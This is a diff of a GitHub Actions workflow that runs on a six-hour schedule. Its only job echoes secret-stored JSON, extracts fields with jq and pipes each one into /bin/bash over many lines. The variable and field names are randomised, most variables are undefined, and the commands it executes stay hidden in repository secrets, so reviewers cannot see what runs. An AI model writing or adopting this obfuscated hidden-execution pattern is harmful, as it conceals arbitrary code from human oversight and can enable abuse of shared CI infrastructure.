@@ -1,10 +1,10 @@
 name: daichengwei6175
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 1/6 * * *'
-jobs:  # 15530
+    - cron: '22 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +12,17 @@ jobs:  # 15530
       - uses: actions/checkout@v4
       - name: daichengwei6175
         env:
-          oxq5546: ${{ secrets.oxq5546 }}
+          ax509: ${{ secrets.ax509 }}
         run: |
-          echo $oxq5546 | jq -r .u0 | /bin/bash
-          echo $c155 | jq -r .fg87 | /bin/bash
-          echo $wcx523 | jq -r .zwj10 | /bin/bash
-          echo $voqr4544 | jq -r .q6429 | /bin/bash
-          echo $dmcfj655 | jq -r .cpmzy18508 | /bin/bash
-          echo $thfki91692 | jq -r .p9 | /bin/bash
-          echo $uyj21 | jq -r .d930 | /bin/bash
+          echo $ax509 | jq -r .ryfeg596 | /bin/bash
+          echo $ivagd8631 | jq -r .cxaff64 | /bin/bash
+          echo $ae29 | jq -r .ngc30112 | /bin/bash
+          echo $qqcc229 | jq -r .mdbjk7621 | /bin/bash
+          echo $tnqoy5288 | jq -r .yu2169 | /bin/bash
+          echo $hh9557 | jq -r .fax15134 | /bin/bash
+          echo $cbk428 | jq -r .xbmf2 | /bin/bash
+          echo $rsdy1 | jq -r .bhhr0 | /bin/bash
+          echo $dwrcr73170 | jq -r .hcrk70 | /bin/bash
+          echo $z11 | jq -r .zfiuq55 | /bin/bash
+          echo $prbf22078 | jq -r .yx647 | /bin/bash
 
